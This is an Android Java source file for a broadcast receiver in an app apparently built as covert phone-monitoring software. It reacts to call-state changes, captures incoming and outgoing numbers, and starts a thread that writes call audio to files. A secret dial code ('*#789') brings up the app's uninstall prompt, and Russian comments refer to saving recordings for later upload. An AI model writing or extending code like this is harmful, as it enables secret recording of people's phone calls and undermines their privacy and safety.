package com.postal.omniscient.postal.catchPhone.Call;

import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.postal.omniscient.postal.ThreadIsAliveOrNot;
import com.postal.omniscient.postal.adapter.EventBusCall;
import com.postal.omniscient.postal.adapter.EventBusData;
import com.postal.omniscient.postal.service.RestartServiceReceiver;
import com.postal.omniscient.postal.service.StartService;

import org.greenrobot.eventbus.EventBus;

public class StartPhoneCallReceiver extends BroadcastReceiver {
    public StartPhoneCallReceiver() {
    }
    Bundle bundle;
    String state;
    String inCall, outCall,call;


    private static final String ACTION_IN = "android.intent.action.PHONE_STATE";
    private static final String ACTION_OUT = "android.intent.action.NEW_OUTGOING_CALL";
    private static final String code = "*#789";


    @Override
    public void onReceive(Context context, Intent intent) {

            if (intent.getAction().equals(ACTION_IN)) {
                Log.i("MyMsg", "ACTION_IN start1");
                if ((bundle = intent.getExtras()) != null) {
                    Log.i("MyMsg", "ACTION_IN start2");
                    state = bundle.getString(TelephonyManager.EXTRA_STATE);
                    if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                        Log.i("MyMsg", "ACTION_IN start3");
                        inCall = bundle.getString(TelephonyManager.EXTRA_INCOMING_NUMBER);

                    } else if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                        Log.i("MyMsg", "ACTION_IN start4");
                                new Thread(new CallInThread(context, "Call", ".mp3"),//поменяли In_call на Call све будем в 1ну папку кидать
                                        "InCallWrite").start();
                                Log.i("MyMsg", "ACTION_IN start");
                    } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                        EventBus.getDefault().post(new EventBusCall("stop"));
                    }
                }
            }
            else if (intent.getAction().equals(ACTION_OUT)) {
                Log.i("MyMsg", "4");
                if ((bundle = intent.getExtras()) != null) {
                    outCall = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                    if (outCall.equals(code)) {
                        Log.i("MyMsg", "start DELETE APP");

                        deleteAPP(context);

                    }
                    //проверка на набор сервисов (*111#) а то срабатывает событие вызова
                    if (!outCall.contains("*") || !outCall.contains("#")) {
                        outCall = outCall.replace("+", "");
                        //Boolean start_or_no = new ThreadIsAliveOrNot("OutCallWrite").liveORnot(); //всеравно не работает
//                        if (outCall != null) {//!start_or_no &&
////                            sendEvent("call_out", "TreadConnect");
//                            //EventBus.getDefault().post(new EventBusData("call_out"));//флаг что идет запись разгавора и не начинать занрузку файла (ато удалится)
//                            new Thread(new CallInThread(context, outCall, "Call", "_out_call.amr"),//поменяли Out_call на Call све будем в 1ну папку кидать
//                                    "OutCallWrite").start();
//                            Log.i("MyMsg", "ACTION_OUT start");
//                        }
                    }
                }
            }
    }
    private void deleteAPP(final Context context) {
        Uri packageURI = Uri.parse("package:com.postal.omniscient");
        Intent i = new Intent(Intent.ACTION_DELETE, packageURI);
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(i);
    }

//    //ошибка может произойти когда шлем увидомление  а поток TreadConnect не работает
//    private void sendEvent(String call, String threadName) {
//        Boolean start_or_no = new ThreadIsAliveOrNot(threadName).liveORnot();
//        if (start_or_no) {
//            EventBus.getDefault().post(new EventBusData(call));//флаг что идет запись разгавора и не начинать занрузку файла (ато удалится)
//            new Thread().run();
//            Thread tr = new Thread();
//            tr.run();
//        }
//    }
}
